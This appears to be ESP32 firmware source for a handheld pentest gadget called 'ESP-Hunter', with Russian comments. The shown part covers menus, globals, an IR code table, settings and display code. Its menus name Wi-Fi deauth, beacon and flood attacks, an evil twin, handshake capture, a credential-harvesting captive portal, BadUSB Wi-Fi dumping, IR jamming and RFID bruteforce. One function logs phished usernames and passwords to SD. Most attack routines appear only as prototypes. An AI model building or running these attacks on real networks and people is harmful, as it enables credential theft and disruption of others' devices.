/*
 * ============================================================================
 *   ESP-Hunter (ОПТИМИЗИРОВАННАЯ ВЕРСИЯ)
 *   ============================================================================
 *   Исправлены лаги: устранены блокирующие задержки, добавлены yield и millis(),
 *   ограничена частота перерисовки, оптимизированы фоновые задачи.
 * ============================================================================
 */

// ======================================================================
// 1. ПОДКЛЮЧЕНИЕ БИБЛИОТЕК
// ======================================================================
#include <Arduino.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <SD.h>
#include <Wire.h>
#include <Adafruit_PN532.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <IRrecv.h>
#include <IRutils.h>
#include <Preferences.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"
#include "Config.h"
#include "Icons.h"
#include "WebPages.h"
#include "Bitmap.h"
#include <esp_task_wdt.h>
#include "Radar_Mode.h"
#include "Bluzzer.h"

// ======================================================================
// 2. КОНСТАНТЫ И СТРУКТУРЫ
// ======================================================================
#define MAX_CAPTURED_LINES  50
#define MAX_SAVED_IR        30
#define MAX_VISIBLE_ITEMS   4
#define COLOR_BLACK         0x0000
#define COLOR_WHITE         0xFFFF
#define COLOR_RED           0xF800
#define COLOR_GREEN         0x07E0
#define COLOR_BLUE          0x001F
#define COLOR_YELLOW        0xFFE0
#define COLOR_CYAN          0x07FF
#define COLOR_MAGENTA       0xF81F
#define COLOR_DARKGREY      0x39E7

struct InputButton {
  uint8_t pin;
  bool state;
  bool lastReading;
  unsigned long lastDebounceTime;
  unsigned long lastRepeatTime;
  bool pressedEvent;
};

struct CapturedIR {
  decode_type_t type = UNKNOWN;
  uint64_t value = 0;
  uint16_t bits = 0;
  bool valid = false;
};

struct WiFiNetwork {
  char ssid[24];
  uint8_t bssid[6];
  int32_t rssi;
  int32_t channel;
};

struct PongState {
  int playerY = 50;
  int aiY = 50;
  float ballX = 64, ballY = 64;
  float ballVX = 2.2, ballVY = 1.5;
  int scorePlayer = 0;
  int scoreAi = 0;
  bool gameOver = false;
};

struct IrCodeEntry {
  decode_type_t protocol;
  uint32_t code;
  uint16_t bits;
  const char* brandName;
};

struct BleTargetDevice {
  char macAddress[18];
  char deviceName[20];
  int signalRssi;
};

// ======================================================================
// 3. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
// ======================================================================
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
GFXcanvas16 canvas(SCREEN_WIDTH, SCREEN_HEIGHT);
USBHIDKeyboard Keyboard;
USBHIDMouse Mouse;
DNSServer dnsServer;
IRsend irsend(IR_TX_PIN);
IRrecv irrecv(IR_RX_PIN);
decode_results irResults;
Adafruit_PN532 nfc(-1, -1, &Wire);
Preferences preferences;
WebServer webServer(80);

bool irJammerActive = true;
BLEScan* bleScannerInstance = NULL;
BleTargetDevice bleScannedList[8];
int bleScannedCount = 0;
bool isEvilPortalRunning = false;
bool isWebServerRunning = false;
int capturedCredsCount = 0;
String lastCapturedCred = "None";
const char* AP_SSID = "ESP-Hunter";
const char* AP_PASS = "ESPhunter";

WiFiNetwork scannedNetworks[12];
int wifiScannedCount = 0;
int wifiSelectedIndex = 0;
int wifiScrollOffset = 0;

// Настройки дисплея
uint8_t currentRotation = 0;
uint8_t selectedColorIndex = 1;
uint16_t accentColor = COLOR_GREEN;
uint8_t backlightBrightness = 128;
bool backlightAvailable = false;

// Меню и навигация
int activeMainMenuItem = 0;
int activeCurrentPage = -1;
int menuScrollIndex = 0;
bool redrawFlag = true;

// Display подменю
int displaySubPage = 0;
int displaySubMenuIndex = 0;

// Состояние периферии
bool isSdCardAvailable = false;
bool isRfidAvailable = false;
bool isIrTxReady = false;
bool isIrRxReady = false;
bool isUsbHidReady = false;

// Переменные для подменю
int irSubMenuScrollOffset = 0;
int gamesSubMenuIndex = 0;
int gamesCurrentSubPage = 0;
int irSubMenuIndex = 0;
int irCurrentSubPage = 0;
int rfidSubMenuIndex = 0;
int rfidCurrentSubPage = 0;
int rfidSubMenuScrollOffset = 0;
int rfidSavedSlotIndex = 0;
int rfidSavedScrollOffset = 0;
char activeRfidUidHex[32] = "None";
uint8_t activeRfidBlock = 4;
int wirelessSubMenuIndex = 0;
int wirelessCurrentSubPage = 0;
int wirelessSubMenuScrollOffset = 0;
int evilPortalSubMenuIndex = 0;
int evilPortalCurrentSubPage = 0;
int evilPortalSubMenuScrollOffset = 0;
int portalSsidIndex = 0;
char evilPortalSsid[32] = "Free_WIFI_Hotspot";
int badUsbSubMenuIndex = 0;
int badUsbCurrentSubPage = 0;
int badUsbSubMenuScrollOffset = 0;
int displaySubMenuScrollOffset = 0;

// Состояние атак
bool isBeaconSpamActive = false;
bool deauthActive = false;
bool isBleSpamActive = false;
bool bleActive = false;

CapturedIR activeIrSignal;
unsigned long marqueeTimer = 0;
int marqueeOffset = 0;
PongState pongState;

InputButton btnUp   = { BTN_UP,   HIGH, HIGH, 0, 0, false };
InputButton btnDown = { BTN_DOWN, HIGH, HIGH, 0, 0, false };
InputButton btnOk   = { BTN_OK,   HIGH, HIGH, 0, 0, false };
InputButton btnEsc  = { BTN_ESC,  HIGH, HIGH, 0, 0, false };

String savedIrList[MAX_SAVED_IR];
int savedIrCount = 0;
int savedIrSelected = 0;
int savedIrScroll = 0;

String capturedCredLines[MAX_CAPTURED_LINES];
int capturedCredCount = 0;
int capturedScrollOffset = 0;
int capturedSelectedIndex = 0;

// Дополнительные переменные для Wi-Fi атак
std::vector<int> wifiSelectedTargets;
int wifiAttackChoice = 0;
int wifiAttackSubPage = 0;
int wifiAttackScroll = 0;
int wifiSettingsPage = 0;
int wifiSettingsSelected = 0;
bool wifiEditValue = false;

unsigned long lastArcadeGameTick = 0;
WifiRadar radar;  // Объект для режима радара

// Настройки атак
int framesPerDeauth = 5;
int sendDelay = 3;
int framesPerBeacon = 3;
int maxClone = 3;
int maxSpamSpace = 3;

// Для захвата Handshake
volatile bool handshakeCapturing = false;
volatile bool handshakeDone = false;
uint8_t handshakeBSSID[6];
uint8_t handshakeClientMAC[6];
uint8_t handshakeAPMAC[6];
uint8_t handshakeEAPOL[4][256];
int handshakeEAPOLCount = 0;
unsigned long handshakeStartTime = 0;
uint8_t handshakeFrameCount = 0;

// Переменные зуммера
bool buzzerEnabled = true;
unsigned long buzzerStartTime = 0;
int buzzerDuration = 0;
int buzzerVolume = 255;     
bool buzzerEditMode = false; 


// Таймеры для оптимизации
unsigned long lastRedrawTime = 0;
const unsigned long REDRAW_INTERVAL = 50; // мс

// ======================================================================
// 4. ТЕКСТЫ МЕНЮ
// ======================================================================
const char* const mainMenuItemsText[] = {
  "Display",
  "Pong",
  "IR",          // <-- Вернули IR!
  "RFID",
  "Wi-Fi",
  "SD Card",
  "About",
  "BadUSB",
  "Evil Portal",
  "Web Remote"
};
const uint8_t MAIN_MENU_COUNT = sizeof(mainMenuItemsText) / sizeof(mainMenuItemsText[0]);

const char* const displaySubMenuItemsText[] = {
  "Rotation",
  "Color",
  "Brightness",
  "Buzzer"
};

const uint8_t DISPLAY_SUB_MENU_COUNT = sizeof(displaySubMenuItemsText) / sizeof(displaySubMenuItemsText[0]);

const char* const irSubMenuItemsText[] = {
  "IR Console",
  "TV-B-Gone",
  "Jammer",
  "Saved IR"
};
const uint8_t IR_MENU_COUNT = sizeof(irSubMenuItemsText) / sizeof(irSubMenuItemsText[0]);

const char* const badUsbSubMenuItemsText[] = {
  "Notepad Demo",
  "Terminal Demo",
  "Run /payload",
  "Custom Text",
  "Shutdown PC",
  "Wallpaper",
  "Disable Icons",
  "Dump Wi-Fi",
  "Lang En/Ru"
};
const uint8_t BADUSB_MENU_COUNT = sizeof(badUsbSubMenuItemsText) / sizeof(badUsbSubMenuItemsText[0]);

const char* const evilPortalSubMenuItemsText[] = {
  "Start Portal",
  "Choose SSID",
  "Saved Passwords"
};
const uint8_t EVIL_PORTAL_MENU_COUNT = sizeof(evilPortalSubMenuItemsText) / sizeof(evilPortalSubMenuItemsText[0]);

const char* const rfidSubMenuItemsText[] = {
  "Read Tag",
  "Emulate UID",
  "Write UID",
  "Write Block",
  "Erase Block",
  "Saved UIDs",
  "Bruteforce"
};
const uint8_t RFID_MENU_COUNT = sizeof(rfidSubMenuItemsText) / sizeof(rfidSubMenuItemsText[0]);

const char* const wirelessSubMenuItemsText[] = {
  "WiFi Scan",
  "All Deauth",
  "Beacon Spam",
  "Beacon Clone",
  "Assoc Flood",
  "Auth Flood",
  "Evil Twin",
  "Sour Apple",
  "Handshake Capture",
  "Radar Mode",
  "Settings"
};
const uint8_t WIRELESS_MENU_COUNT = sizeof(wirelessSubMenuItemsText) / sizeof(wirelessSubMenuItemsText[0]);

const char* const attackChoiceList[] = {
  "Deauth",
  "Beacon Spam",
  "Beacon Clone",
  "Assoc Flood",
  "Auth Flood",
  "Evil Twin",
  "Sour Apple",
  "Handshake Capture"
};
const uint8_t ATTACK_CHOICE_COUNT = sizeof(attackChoiceList) / sizeof(attackChoiceList[0]);

const char* const colorNamesList[] = { "RED", "GREEN", "BLUE", "YELLOW", "CYAN", "MAGENTA", "WHITE" };
const uint16_t colorValuesList[] = {
  COLOR_RED, COLOR_GREEN, COLOR_BLUE, COLOR_YELLOW,
  COLOR_CYAN, COLOR_MAGENTA, COLOR_WHITE
};
const uint8_t COLOR_COUNT = sizeof(colorValuesList) / sizeof(colorValuesList[0]);

// База TV-B-Gone (сокращена)
const IrCodeEntry tvBGoneDatabase[] = {
  {NEC,0xE0E040BF,32,"Samsung TV 1"},{SAMSUNG,0xE0E019E6,32,"Samsung TV 2"},
  {NEC,0x20DF10EF,32,"LG TV WebOS"},{SONY,0x00000A81,12,"Sony TV 12b"},
  {SONY,0x00000750,15,"Sony TV 15b"},{PANASONIC,0x0008020D,48,"Panasonic TV"},
  {NEC,0x02FD48B7,32,"Toshiba TV"},{NEC,0x00F210EF,32,"Sharp TV"},
  {NEC,0x04FB08F7,32,"TCL / Thomson"},{NEC,0x10EF7887,32,"Hisense TV"},
  {RC5,0x0000000C,12,"Philips TV RC5"},{RC6,0x0000000C,20,"Philips TV RC6"},
  {NEC,0xF708FB04,32,"Philips TV NEC"},{NEC,0x000020DF,32,"Vizio TV 1"},
  {NEC,0x0202807F,32,"Vizio TV 2"},{NEC,0x00F208F7,32,"Xiaomi Mi TV"},
  {NEC,0x1D2E00FF,32,"Sanyo TV"},{NEC,0x00F220DF,32,"Insignia TV"},
  {JVC,0x0000C561,16,"JVC TV"},{NEC,0xA55A38C7,32,"Pioneer TV"},
  {NEC,0x00F212ED,32,"RCA TV"},{NEC,0x57E3E817,32,"Hitachi TV"},
  {NEC,0x232C00FF,32,"Mitsubishi TV"},{NEC,0x0202807F,32,"Westinghouse"},
  {NEC,0x00F200FF,32,"Haier TV"},{NEC,0x00F2A05F,32,"Sceptre TV"},
  {NEC,0x20DF10EF,32,"Funai TV"},{NEC,0x00F210EF,32,"Daewoo TV"},
  {NEC,0x00F240BF,32,"Akai TV"},{RC5,0x00000C0C,12,"Grundig TV"},
  {NEC,0x48B702FD,32,"Telefunken TV"},{NEC,0x02FD00FF,32,"Apex TV"},
  {NEC,0x00F228D7,32,"Changhong TV"},{NEC,0x00F2807F,32,"Sansui TV"},
  {NEC,0x02FD28D7,32,"Skyworth TV"},{NEC,0x00F248B7,32,"ViewSonic TV"},
  {NEC,0x20DF00FF,32,"Orion TV"},{NEC,0x00F2807F,32,"Element TV"},
  {NEC,0x02FD807F,32,"AOC TV"},{NEC,0x00F2C03F,32,"Blaupunkt TV"},
  {GREE,0x09200000,32,"Gree AC"},{NEC,0xB24D7B84,32,"Midea AC"},
  {DAIKIN,0x11DA2700,32,"Daikin AC"},{MITSUBISHI,0x23CB2601,32,"Mitsubishi AC"},
  {PANASONIC,0x0220E004,32,"Panasonic AC"},{SAMSUNG,0x02B20F00,32,"Samsung AC"},
  {LG,0x08800909,28,"LG AC"},{NEC,0xA55A00FF,32,"Haier AC"},
  {NEC,0xC33C00FF,32,"AUX AC"},{NEC,0xB24D00FF,32,"Ballu AC"},
  {NEC,0xB24D7B84,32,"Electrolux AC"},{NEC,0xF20D03FC,32,"Toshiba AC"},
  {NEC,0x4F000000,32,"Carrier AC"},{NEC,0x23CB00FF,32,"TCL AC"},
  {NEC,0x12345678,32,"Hisense AC"},{NEC,0xB24D1234,32,"Hyundai AC"},
  {NEC,0x11DA0001,32,"GE AC"},{NEC,0xB24D8877,32,"York AC"},
  {NEC,0xC1AA09F6,32,"Epson Proj ON"},{NEC,0xC1AA8976,32,"Epson Proj OFF"},
  {NEC,0x00E008F7,32,"BenQ Proj"},{NEC,0x02FD48B7,32,"Optoma Proj"},
  {NEC,0x181850AF,32,"NEC Proj"},{NEC,0x835D807F,32,"ViewSonic Proj"},
  {SONY,0x00000A81,12,"Sony Proj"},{PANASONIC,0x0008020D,48,"Panasonic Proj"},
  {NEC,0x11EE30CF,32,"InFocus Proj"},{NEC,0x02FD08F7,32,"Acer Proj"},
  {NEC,0x20DF10EF,32,"Vivitek Proj"},{NEC,0x00F210EF,32,"Canon Proj"},
  {NEC,0x1D2E00FF,32,"Casio Proj"},{NEC,0x02FD28D7,32,"Christie Proj"},
  {NEC,0x04FB08F7,32,"Barco Proj"},{NEC,0x7E8800FF,32,"Yamaha AV"},
  {NEC,0xA55A38C7,32,"Pioneer AV"},{NEC,0x2A4C02FD,32,"Denon AV"},
  {RC5,0x0000000C,12,"Marantz Audio"},{NEC,0x4B36D32C,32,"Onkyo AV"},
  {NEC,0x807E00FF,32,"JBL Soundbar"},{NEC,0x00FF00FF,32,"Bose Soundbar"},
  {SONY,0x00000541,12,"Sony Audio"},{SAMSUNG,0xC2CA807F,32,"Samsung Soundbar"},
  {NEC,0x20DF10EF,32,"LG Soundbar"},{NEC,0x01A200FF,32,"Harman Kardon"},
  {RC5,0x0000000C,12,"Philips Audio"},{PANASONIC,0x0008020D,48,"Panasonic Audio"},
  {NEC,0x00F210EF,32,"Nakamichi Sound"},{NEC,0x20DF10EF,32,"Sonos Audio"},
  {NEC,0x77E1FA00,32,"Apple TV IR"},{NEC,0x57430000,32,"Roku TV Box"},
  {SONY,0x00000A81,12,"Nvidia Shield"},{NEC,0x00F208F7,32,"Mi Box Android"},
  {RC5,0x0000000C,12,"MAG IPTV Box"},{SONY,0x00000A81,12,"Comcast STB"},
  {SONY,0x00000750,15,"DirecTV STB"},{SONY,0x00000A81,12,"Dish Network"},
  {SONY,0x00000B8B,12,"Sony Blu-Ray"},{NEC,0x20DF10EF,32,"LG DVD/BD"}
};
const uint8_t TV_B_GONE_TOTAL_CODES = sizeof(tvBGoneDatabase)/sizeof(tvBGoneDatabase[0]);

// ======================================================================
// 5. ПРОТОТИПЫ ФУНКЦИЙ
// ======================================================================
void drawHeaderBar(const char* headerTitle);
void drawFooterBar(const char* footerText);
void canvasFlush();
void setBacklight(uint8_t value);
void applyRotation(uint8_t rot);
void saveSystemSettings();
void loadSystemSettings();
void initializeSdCardStorage();
void initializeRfidHardware();
void processSerialCommands();
void sendScreenData();
void showPopup(const char* msg, int duration = 1500);

// IR
void processIrRxTask();
void transmitCapturedIrSignal();
void saveCapturedIrLogToSd();
void saveIrSignalToSdList(decode_type_t proto, uint64_t val, uint16_t bits);
void loadIrSignalList();
void drawIrSavedListPage();
void sendIrSavedSignal(int index);
void runClassicTvBGoneLoop();
void runIrJammer();

// RFID
void executeRfidTagScan();
void emulateActiveRfidUid();
void saveActiveRfidToStorage();
void writeUidToCuidTag();
void writeDataToCustomBlock();
void eraseDataOnCustomBlock();
void bruteForceRfid();

// Wi-Fi
void executeWiFiScan();
void drawWiFiScanPage();
void drawBeaconSpamPage();
void drawDeauthPage();
void drawBleSpamPage();
void drawBleSnifferPage();
void executeSdWardrivingLog();
void wifiBruteforce();
void tickBeaconSpamTask();
void drawRadarPage();
void runDeauthTick();
void drawAttackChoiceMenu();
void runDeauthAttack(bool all);
void runBeaconAttack(bool clone);
void runAssocAuthAttack(bool auth);
void runEvilTwin();
void runSourApple();
void drawWiFiSettingsPage();
void wifi_random_mac(uint8_t *mac);
void wifi_send_deauth(uint8_t* bssid, uint8_t* dst, uint16_t reason);
void wifi_send_beacon(uint8_t* src, uint8_t* dst, const char* ssid, bool withRSN);
void wifi_send_assoc(uint8_t* src, uint8_t* bssid, const char* ssid, uint16_t seq);
void wifi_send_auth(uint8_t* src, uint8_t* bssid, uint16_t seq);
void captureHandshake(int targetIdx);
void promiscuousRxCallback(void *buf, wifi_promiscuous_pkt_type_t type);
void saveHandshakeToSD();

// BLE
void startBleSpamAttack();
void stopBleSpamAttack();
void runBleSnifferScan();

// Evil Portal
void startEvilPortalService();
void loadCapturedCredentials();
void capturedpasswords();
void drawPortalSsidSelectPage();
void drawEvilPortalPage();

// BadUSB
void ensureEnglishLayout();
void runBadUsbDemoNotepad();
void runBadUsbDemoTerminal();
void executeDuckyScriptFromSd();
void runBadUsbCustomString(String txt);
void runBadUsbShutdown();
void runBadUsbWallpaper();
void runBadUsbDisableIcons();
void runBadUsbDumpWifi();

// Web Remote
void setupWebServerRoutes();
void runWebServerMode();

// Меню и отрисовка
void drawGenericSubMenu(const char* titleText, const char* const menuItemsList[], uint8_t itemsCount, int selectedIndex, int &scrollOffset);
void drawMainNavigatorMenu();
void drawDisplaySubMenu();
void drawRotationPage();
void drawColorPage();
void drawBrightnessPage();
void drawSdInfoPage();
void drawAboutSystemPage();
void renderCurrentActivePage();
void renderPongGameLoop(bool isUp, bool isDown, bool isOk);
void resetPongGameState();
void initBuzzer();
void updateBuzzer();
String generateRandomString(int len);

void initBuzzer() {
  ledcAttach(BUZZER_PIN, 2000, 8);
  ledcWrite(BUZZER_PIN, 0); 
}

void playBeep(int freq, int duration, int volume ) {
 
  if (volume != -1 && !buzzerEnabled) return;
  int vol = (volume == -1) ? buzzerVolume  : volume; 
  if (volume != -1 && vol <= 0) return; 

  ledcWriteTone(BUZZER_PIN, freq);
  ledcWrite(BUZZER_PIN, vol);
  buzzerStartTime = millis();
  buzzerDuration = duration;
}

void updateBuzzer() {
  if (buzzerDuration > 0 && millis() - buzzerStartTime >= buzzerDuration) {
    ledcWrite(BUZZER_PIN, 0);      // Ставим ШИМ на 0
    digitalWrite(BUZZER_PIN, LOW); // Принудительно отключаем пин (вдруг ШИМ залип)
    buzzerDuration = 0;
  }
}


void playSplashMelody() {
  if (!buzzerEnabled) return; 
  int vol = (int)(buzzerVolume * 0.9); // Слегка тише
  if (vol < 1) vol = 1; 

 
  playBeep(523, 200, vol);  delay(100); // C5
  playBeep(659, 200, vol);  delay(100); // E5
  playBeep(784, 200, vol);  delay(100); // G5
  playBeep(1047, 400, vol); delay(100); // C6 
  playBeep(784, 200, vol);  delay(100); // G5
  playBeep(659, 200, vol);  delay(100); // E5
  playBeep(523, 300, vol);  delay(100); // C5
  playBeep(1047, 400, vol);             
}

// ======================================================================
// 6. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ======================================================================
void canvasFlush() {
  digitalWrite(SD_CS, HIGH);
  digitalWrite(TFT_CS, LOW);
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
  digitalWrite(TFT_CS, HIGH);
}

void updateButton(InputButton &btn, bool allowAutoRepeat) {
  bool reading = digitalRead(btn.pin);
  unsigned long now = millis();
  if (reading != btn.lastReading) {
    btn.lastDebounceTime = now;
    btn.lastReading = reading;
  }
  if ((now - btn.lastDebounceTime) > 20) {
    if (reading != btn.state) {
      btn.state = reading;
      if (btn.state == LOW) {
        btn.pressedEvent = true;
        btn.lastRepeatTime = now;
      }
    } else if (btn.state == LOW && allowAutoRepeat) {
      if ((now - btn.lastRepeatTime) > 250) {
        btn.lastRepeatTime = now - 130;
        btn.pressedEvent = true;
      }
    }
  }
}

bool getButtonPress(InputButton &btn) {
  if (btn.pressedEvent) {
    btn.pressedEvent = false;
    return true;
  }
  return false;
}

void applyRotation(uint8_t rot) {
  currentRotation = rot % 4;
  tft.setRotation(currentRotation);
  canvas.setRotation(0);
}

void setBacklight(uint8_t value) {
  backlightBrightness = value;
  if (backlightAvailable) {
    analogWrite(BACKLIGHT_PIN, value);
  }
  preferences.putUChar("brightness", value);
}

void showPopup(const char* msg, int duration) {
  drawHeaderBar("INFO");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 40);
  canvas.print(msg);
  canvasFlush();
  delay(duration);
}

void saveSystemSettings() {
  preferences.putUChar("rotation", currentRotation);
  preferences.putUChar("colorIdx", selectedColorIndex);
  preferences.putUChar("brightness", backlightBrightness);
  preferences.putBool("buzzer", buzzerEnabled);
   preferences.putInt("buzzerVol", buzzerVolume);
  if (isSdCardAvailable) {
    digitalWrite(TFT_CS, HIGH);
    digitalWrite(SD_CS, LOW);
    File configFile = SD.open("/config.txt", FILE_WRITE);
    if (configFile) {
      configFile.printf("ROTATION=%d\nCOLOR_INDEX=%d\nBRIGHTNESS=%d\n",
                        currentRotation, selectedColorIndex, backlightBrightness);
      configFile.close();
    }
    digitalWrite(SD_CS, HIGH);
  }
}

void loadSystemSettings() {
  currentRotation = preferences.getUChar("rotation", 0) % 4;
  selectedColorIndex = preferences.getUChar("colorIdx", 1) % COLOR_COUNT;
  backlightBrightness = preferences.getUChar("brightness", 128);
  if (isSdCardAvailable) {
    digitalWrite(TFT_CS, HIGH);
    digitalWrite(SD_CS, LOW);
    if (SD.exists("/config.txt")) {
      File configFile = SD.open("/config.txt", FILE_READ);
      if (configFile) {
        while (configFile.available()) {
          String line = configFile.readStringUntil('\n');
          line.trim();
          if (line.startsWith("ROTATION=")) {
            currentRotation = line.substring(9).toInt() % 4;
          } else if (line.startsWith("COLOR_INDEX=")) {
            selectedColorIndex = line.substring(12).toInt() % COLOR_COUNT;
          } else if (line.startsWith("BRIGHTNESS=")) {
            backlightBrightness = (uint8_t)line.substring(11).toInt();
          }
        }
        configFile.close();
      }
    }
    digitalWrite(SD_CS, HIGH);
  }
  accentColor = colorValuesList[selectedColorIndex];
  applyRotation(currentRotation);
  setBacklight(backlightBrightness);
  buzzerEnabled = preferences.getBool("buzzer", true);
  buzzerVolume = preferences.getInt("buzzerVol", 128);
  }

void initializeSdCardStorage() {
  pinMode(SD_CS, OUTPUT);
  digitalWrite(SD_CS, HIGH);
  pinMode(TFT_CS, OUTPUT);
  digitalWrite(TFT_CS, HIGH);
  isSdCardAvailable = SD.begin(SD_CS, SPI, 4000000);
}

void initializeRfidHardware() {
  Wire.begin(PN532_SDA, PN532_SCL);
  Wire.setClock(100000);
  Wire.setTimeOut(20);
  nfc.begin();
  uint32_t verData = nfc.getFirmwareVersion();
  if (verData) {
    nfc.SAMConfig();
    isRfidAvailable = true;
    Serial.println("[PN532] Hardware OK");
  } else {
    isRfidAvailable = false;
    Serial.println("[PN532] Not responding");
  }
}

void appendCredToSd(const String& user, const String& pass) {
  if (!isSdCardAvailable) return;
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File logFile = SD.open("/captured_creds.txt", FILE_APPEND);
  if (logFile) {
    logFile.printf("USER: %s | PASS: %s\n", user.c_str(), pass.c_str());
    logFile.close();
  }
  digitalWrite(SD_CS, HIGH);
}

void appendRfidLogToSd(const char* uidHexString) {
  if (!isSdCardAvailable) return;
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File logFile = SD.open("/rfid_log.txt", FILE_APPEND);
  if (logFile) {
    logFile.printf("LOG_UID: %s\n", uidHexString);
    logFile.close();
  }
  digitalWrite(SD_CS, HIGH);
}

void appendIrLogToSd(decode_type_t proto, uint64_t val, uint16_t bits) {
  if (!isSdCardAvailable) return;
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File logFile = SD.open("/ir_log.txt", FILE_APPEND);
  if (logFile) {
    logFile.printf("IR_PROTO: %s | VAL: 0x%X | BITS: %d\n",
                   typeToString(proto).c_str(), (uint32_t)val, bits);
    logFile.close();
  }
  digitalWrite(SD_CS, HIGH);
}

void readSavedUidFromFlash(uint8_t slot, char* bufferOut, size_t maxLen) {
  char slotKey[16];
  snprintf(slotKey, sizeof(slotKey), "rfid_slot_%u", slot);
  String storedUid = preferences.getString(slotKey, "");
  if (storedUid.length() > 0) {
    snprintf(bufferOut, maxLen, "%s", storedUid.c_str());
  } else {
    bufferOut[0] = '\0';
  }
}



void writeUidToFlashSlot(uint8_t slot, const char* uidHexString) {
  char slotKey[16];
  snprintf(slotKey, sizeof(slotKey), "rfid_slot_%u", slot);
  preferences.putString(slotKey, uidHexString);
}

String generateRandomString(int len) {
  const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  String s;
  for (int i = 0; i < len; i++) s += chars[random(0, sizeof(chars)-1)];
  return s;
}

// ======================================================================
// 7. ОТРИСОВКА ИНТЕРФЕЙСА
// ======================================================================
void drawHeaderBar(const char* headerTitle) {
  canvas.fillScreen(COLOR_BLACK);
  canvas.drawFastHLine(0, 0, 128, accentColor);
  canvas.setTextWrap(false);
  canvas.setTextSize(1);
  canvas.setTextColor(accentColor);
  canvas.setCursor(4, 5);
  canvas.print(">_ ");
  canvas.print(headerTitle);
  canvas.drawFastHLine(0, 18, 128, accentColor);
}

void drawFooterBar(const char* footerText) {
  canvas.fillRect(0, 114, 128, 14, COLOR_BLACK);
  canvas.drawFastHLine(0, 113, 128, accentColor);
  canvas.setTextColor(accentColor);
  canvas.setTextSize(1);
  canvas.setCursor(3, 117);
  canvas.print("[");
  canvas.print(footerText);
  canvas.print("]");
}

void drawGenericSubMenu(const char* titleText, const char* const menuItemsList[],
                        uint8_t itemsCount, int selectedIndex, int &scrollOffset) {
  if (selectedIndex < scrollOffset) scrollOffset = selectedIndex;
  if (selectedIndex >= scrollOffset + MAX_VISIBLE_ITEMS) {
    scrollOffset = selectedIndex - MAX_VISIBLE_ITEMS + 1;
  }
  drawHeaderBar(titleText);
  if (millis() - marqueeTimer > 200) {
    marqueeTimer = millis();
    marqueeOffset++;
  }
  for (uint8_t i = 0; i < MAX_VISIBLE_ITEMS; i++) {
    int itemIdx = i + scrollOffset;
    if (itemIdx >= itemsCount) break;
    int lineY = 25 + i * 20;
    String itemText = String(menuItemsList[itemIdx]);
    if (itemIdx == selectedIndex) {
      canvas.drawRect(2, lineY - 2, 124, 17, accentColor);
      canvas.setTextColor(accentColor);
      canvas.setCursor(6, lineY);
      canvas.print("> ");
      if (itemText.length() * 6 > 100) {
        int shift = marqueeOffset % (itemText.length() + 3);
        String subText = itemText.substring(shift) + "   " + itemText.substring(0, shift);
        canvas.print(subText.substring(0, 15));
      } else {
        canvas.print(itemText);
      }
    } else {
      canvas.setTextColor(COLOR_WHITE);
      canvas.setCursor(6, lineY);
      canvas.print("  ");
      canvas.print(itemText.substring(0, 17));
    }
  }
  if (itemsCount > MAX_VISIBLE_ITEMS) {
    int barHeight = 85 / itemsCount;
    int barY = 25 + (scrollOffset * 85) / itemsCount;
    canvas.drawFastVLine(126, 25, 85, COLOR_DARKGREY);
    canvas.fillRect(125, barY, 3, barHeight < 5 ? 5 : barHeight, accentColor);
  }
  drawFooterBar("UP/DN:Nav  OK:Select");
  canvasFlush();
}

void drawMainNavigatorMenu() {
  drawHeaderBar("ESP-Hunter");
  if (activeMainMenuItem < menuScrollIndex) menuScrollIndex = activeMainMenuItem;
  if (activeMainMenuItem >= menuScrollIndex + MAX_VISIBLE_ITEMS) {
    menuScrollIndex = activeMainMenuItem - MAX_VISIBLE_ITEMS + 1;
  }
  if (millis() - marqueeTimer > 200) {
    marqueeTimer = millis();
    marqueeOffset++;
  }
  const int ICON_SIZE = 16;
  const int ICON_OFFSET = ICON_SIZE + 4;

  for (uint8_t i = 0; i < MAX_VISIBLE_ITEMS; i++) {
    int itemIdx = i + menuScrollIndex;
    if (itemIdx >= MAIN_MENU_COUNT) break;
    int lineY = 25 + i * 20;
    String itemText = String(mainMenuItemsText[itemIdx]);
    const unsigned char* iconPtr = (const unsigned char*)pgm_read_ptr(&menuIcons[itemIdx]);

    if (itemIdx == activeMainMenuItem) {
      canvas.drawRect(2, lineY - 2, 124, 17, accentColor);
      canvas.drawBitmap(4, lineY, iconPtr, ICON_SIZE, ICON_SIZE, accentColor, COLOR_BLACK);
      canvas.setTextColor(accentColor);
      canvas.setCursor(ICON_OFFSET + 2, lineY);
      if (itemText.length() * 6 > (124 - ICON_OFFSET - 4)) {
        int shift = marqueeOffset % (itemText.length() + 3);
        String subText = itemText.substring(shift) + "   " + itemText.substring(0, shift);
        canvas.print(subText.substring(0, 15));
      } else {
        canvas.print(itemText);
      }
    } else {
      canvas.drawBitmap(4, lineY, iconPtr, ICON_SIZE, ICON_SIZE, COLOR_DARKGREY, COLOR_BLACK);
      canvas.setTextColor(COLOR_WHITE);
      canvas.setCursor(ICON_OFFSET + 2, lineY);
      canvas.print(itemText.substring(0, 17));
    }
  }

  if (MAIN_MENU_COUNT > MAX_VISIBLE_ITEMS) {
    int barHeight = 85 / MAIN_MENU_COUNT;
    int barY = 25 + (menuScrollIndex * 85) / MAIN_MENU_COUNT;
    canvas.drawFastVLine(126, 25, 85, COLOR_DARKGREY);
    canvas.fillRect(125, barY, 3, barHeight < 5 ? 5 : barHeight, accentColor);
  }
  drawFooterBar("UP/DN:Nav  OK:Open");
  canvasFlush();
}



// ======================================================================
